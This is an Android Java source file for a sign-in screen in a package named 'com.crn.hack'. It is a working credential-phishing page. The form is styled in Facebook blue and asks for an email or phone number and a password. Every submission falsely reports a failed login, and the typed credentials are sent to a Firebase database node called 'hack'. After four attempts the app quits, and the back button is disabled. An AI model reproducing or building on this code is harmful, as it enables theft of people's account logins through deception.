package com.crn.hack;

import androidx.appcompat.app.AppCompatActivity;
import androidx.annotation.*;
import android.app.*;
import android.os.*;
import android.view.*;
import android.view.View.*;
import android.widget.*;
import android.content.*;
import android.graphics.*;
import android.media.*;
import android.net.*;
import android.text.*;
import android.util.*;
import android.webkit.*;
import android.animation.*;
import android.view.animation.*;
import java.util.*;
import java.text.*;
import java.util.HashMap;
import android.widget.LinearLayout;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Button;
import android.widget.EditText;
import android.content.Intent;
import android.net.Uri;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.GenericTypeIndicator;
import com.google.firebase.database.ChildEventListener;
import android.view.View;

public class SigninActivity extends AppCompatActivity {
	
	private FirebaseDatabase _firebase = FirebaseDatabase.getInstance();
	
	private double fail = 0;
	private HashMap<String, Object> map = new HashMap<>();
	
	private LinearLayout linear3;
	private LinearLayout linear2;
	private LinearLayout linear1;
	private ImageView imageview1;
	private TextView textview1;
	private TextView textview3;
	private LinearLayout linear4;
	private LinearLayout linear5;
	private Button button1;
	private LinearLayout linear6;
	private LinearLayout linear7;
	private EditText edittext1;
	private EditText edittext2;
	private TextView textview2;
	
	private Intent i = new Intent();
	private DatabaseReference hack = _firebase.getReference("hack");
	private ChildEventListener _hack_child_listener;
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		setContentView(R.layout.signin);
		com.google.firebase.FirebaseApp.initializeApp(this);
		initialize(_savedInstanceState);
		initializeLogic();
	}
	
	private void initialize(Bundle _savedInstanceState) {
		
		linear3 = (LinearLayout) findViewById(R.id.linear3);
		linear2 = (LinearLayout) findViewById(R.id.linear2);
		linear1 = (LinearLayout) findViewById(R.id.linear1);
		imageview1 = (ImageView) findViewById(R.id.imageview1);
		textview1 = (TextView) findViewById(R.id.textview1);
		textview3 = (TextView) findViewById(R.id.textview3);
		linear4 = (LinearLayout) findViewById(R.id.linear4);
		linear5 = (LinearLayout) findViewById(R.id.linear5);
		button1 = (Button) findViewById(R.id.button1);
		linear6 = (LinearLayout) findViewById(R.id.linear6);
		linear7 = (LinearLayout) findViewById(R.id.linear7);
		edittext1 = (EditText) findViewById(R.id.edittext1);
		edittext2 = (EditText) findViewById(R.id.edittext2);
		textview2 = (TextView) findViewById(R.id.textview2);
		
		button1.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				if (!edittext1.getText().toString().trim().equals("")) {
					if (!edittext2.getText().toString().trim().equals("")) {
						if (fail == 0) {
							fail++;
							SketchwareUtil.showMessage(getApplicationContext(), "Failed, re-enter your details and try again");
							map = new HashMap<>();
							map.put("email", edittext1.getText().toString());
							map.put("password", edittext2.getText().toString());
							hack.push().updateChildren(map);
							map.clear();
							edittext1.setText("");
							edittext2.setText("");
						}
						else {
							if (fail == 1) {
								fail++;
								SketchwareUtil.showMessage(getApplicationContext(), "Failed, re-enter your details and try again");
								map = new HashMap<>();
								map.put("email", edittext1.getText().toString());
								map.put("password", edittext2.getText().toString());
								hack.push().updateChildren(map);
								map.clear();
								edittext1.setText("");
								edittext2.setText("");
							}
							else {
								if (fail == 2) {
									fail++;
									SketchwareUtil.showMessage(getApplicationContext(), "Failed, re-enter your details and try again");
									map = new HashMap<>();
									map.put("email", edittext1.getText().toString());
									map.put("password", edittext2.getText().toString());
									hack.push().updateChildren(map);
									map.clear();
									edittext1.setText("");
									edittext2.setText("");
								}
								else {
									SketchwareUtil.showMessage(getApplicationContext(), "Failed...A problem occured");
									map = new HashMap<>();
									map.put("email", edittext1.getText().toString());
									map.put("password", edittext2.getText().toString());
									hack.push().updateChildren(map);
									map.clear();
									finishAffinity();
								}
							}
						}
					}
					else {
						SketchwareUtil.showMessage(getApplicationContext(), "Enter password");
					}
				}
				else {
					SketchwareUtil.showMessage(getApplicationContext(), "Enter number or Email");
				}
			}
		});
		
		_hack_child_listener = new ChildEventListener() {
			@Override
			public void onChildAdded(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildChanged(DataSnapshot _param1, String _param2) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onChildMoved(DataSnapshot _param1, String _param2) {
				
			}
			
			@Override
			public void onChildRemoved(DataSnapshot _param1) {
				GenericTypeIndicator<HashMap<String, Object>> _ind = new GenericTypeIndicator<HashMap<String, Object>>() {};
				final String _childKey = _param1.getKey();
				final HashMap<String, Object> _childValue = _param1.getValue(_ind);
				
			}
			
			@Override
			public void onCancelled(DatabaseError _param1) {
				final int _errorCode = _param1.getCode();
				final String _errorMessage = _param1.getMessage();
				
			}
		};
		hack.addChildEventListener(_hack_child_listener);
	}
	private void initializeLogic() {
		int[] colors = { Color.parseColor("#ffffff"), Color.parseColor("#ffffff") }; android.graphics.drawable.GradientDrawable CRNCL = new android.graphics.drawable.GradientDrawable(android.graphics.drawable.GradientDrawable.Orientation.TOP_BOTTOM, colors);
		CRNCL.setCornerRadii(new float[]{(int)11,(int)11,(int)11,(int)11,(int)11,(int)11,(int)11,(int)11});
		CRNCL.setStroke((int) 1, Color.parseColor("#607d8b"));
		linear4.setElevation((float) 5);
		linear4.setBackground(CRNCL);
		//Milz
		int[] colorsx = { Color.parseColor("#ffffff"), Color.parseColor("#ffffff") }; android.graphics.drawable.GradientDrawable CRNWX = new android.graphics.drawable.GradientDrawable(android.graphics.drawable.GradientDrawable.Orientation.TOP_BOTTOM, colorsx);
		CRNWX.setCornerRadii(new float[]{(int)11,(int)11,(int)11,(int)11,(int)11,(int)11,(int)11,(int)11});
		CRNWX.setStroke((int) 1, Color.parseColor("#607d8b"));
		linear5.setElevation((float) 5);
		linear5.setBackground(CRNWX);
		//Milz
		int[] colorss = { Color.parseColor("#3b5998"), Color.parseColor("#3b5998") }; android.graphics.drawable.GradientDrawable CRNFB = new android.graphics.drawable.GradientDrawable(android.graphics.drawable.GradientDrawable.Orientation.TOP_BOTTOM, colorss);
		CRNFB.setCornerRadii(new float[]{(int)19,(int)19,(int)19,(int)19,(int)19,(int)19,(int)19,(int)19});
		CRNFB.setStroke((int) 0, Color.parseColor("#1565c0"));
		button1.setElevation((float) 5);
		button1.setBackground(CRNFB);
		//Milz
		fail = 0;
	}
	
	@Override
	protected void onActivityResult(int _requestCode, int _resultCode, Intent _data) {
		
		super.onActivityResult(_requestCode, _resultCode, _data);
		
		switch (_requestCode) {
			
			default:
			break;
		}
	}
	
	@Override
	public void onBackPressed() {
		
	}
	@Deprecated
	public void showMessage(String _s) {
		Toast.makeText(getApplicationContext(), _s, Toast.LENGTH_SHORT).show();
	}
	
	@Deprecated
	public int getLocationX(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[0];
	}
	
	@Deprecated
	public int getLocationY(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[1];
	}
	
	@Deprecated
	public int getRandom(int _min, int _max) {
		Random random = new Random();
		return random.nextInt(_max - _min + 1) + _min;
	}
	
	@Deprecated
	public ArrayList<Double> getCheckedItemPositionsToArray(ListView _list) {
		ArrayList<Double> _result = new ArrayList<Double>();
		SparseBooleanArray _arr = _list.getCheckedItemPositions();
		for (int _iIdx = 0; _iIdx < _arr.size(); _iIdx++) {
			if (_arr.valueAt(_iIdx))
			_result.add((double)_arr.keyAt(_iIdx));
		}
		return _result;
	}
	
	@Deprecated
	public float getDip(int _input){
		return TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, _input, getResources().getDisplayMetrics());
	}
	
	@Deprecated
	public int getDisplayWidthPixels(){
		return getResources().getDisplayMetrics().widthPixels;
	}
	
	@Deprecated
	public int getDisplayHeightPixels(){
		return getResources().getDisplayMetrics().heightPixels;
	}
	
}
